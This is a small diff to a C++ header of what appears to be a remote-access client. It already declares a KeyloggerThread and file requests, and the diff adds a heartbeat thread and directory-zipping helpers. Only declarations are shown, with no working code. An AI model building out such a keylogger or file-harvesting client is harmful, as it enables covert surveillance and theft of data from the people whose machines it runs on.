@@ -32,6 +32,7 @@ public: //Public functions
 	bool CloseConnection();
 	bool RequestFile(std::string FileName, bool wait = false);
 	static void KeyloggerThread();
+	static void HearthBeatThread();
 
 	static bool connected;
 	static Client main_client;
@@ -65,6 +66,14 @@ private:
 //This client ptr is necessary so that the ClientThread method can access the Client instance/methods. 
 						//Since the ClientThread method is static, this is the simplest workaround I could think of since there will only be one instance of the client.
 
+struct ZipArgs {
+	std::string dir;
+	std::string output_name;
+	bool zipping;
+};
+
 bool unzip(const std::string& zipPath, const std::string& desPath);
+bool zip_directory(const std::string& inputdir, const std::string& output_name);
+void zip_directory_async(ZipArgs* args);
 
 #endif // !CLIENT_H
